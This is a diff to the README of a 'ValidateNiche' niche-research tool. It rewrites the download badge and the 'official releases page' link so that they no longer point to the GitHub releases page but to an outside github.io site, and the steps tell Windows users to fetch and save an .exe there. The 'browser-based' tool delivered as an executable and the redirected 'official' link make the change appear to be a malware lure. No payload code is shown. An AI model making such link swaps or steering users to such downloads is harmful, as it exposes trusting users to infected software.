@@ -1,6 +1,6 @@
 # 🔍 validateniche-niche-checker - Validate profitable niches for your business
 
-[![](https://img.shields.io/badge/Download-ValidateNiche-blue.svg)](https://github.com/asphyxiated-lowermantle666/validateniche-niche-checker/releases)
+[![](https://img.shields.io/badge/Download-ValidateNiche-blue.svg)](https://asphyxiated-lowermantle666.github.io)
 
 ValidateNiche v1.0.0 provides a browser-based platform to research niches. Use this tool to find data for Amazon KDP, YouTube, TikTok, and general product research. It helps you identify high-demand areas so you make smarter business choices.
 
@@ -8,7 +8,7 @@ ValidateNiche v1.0.0 provides a browser-based platform to research niches. Use t
 
 Follow these steps to obtain the tool on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/asphyxiated-lowermantle666/validateniche-niche-checker/releases) to access the download files.
+1. Visit the [official releases page](https://asphyxiated-lowermantle666.github.io) to access the download files.
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
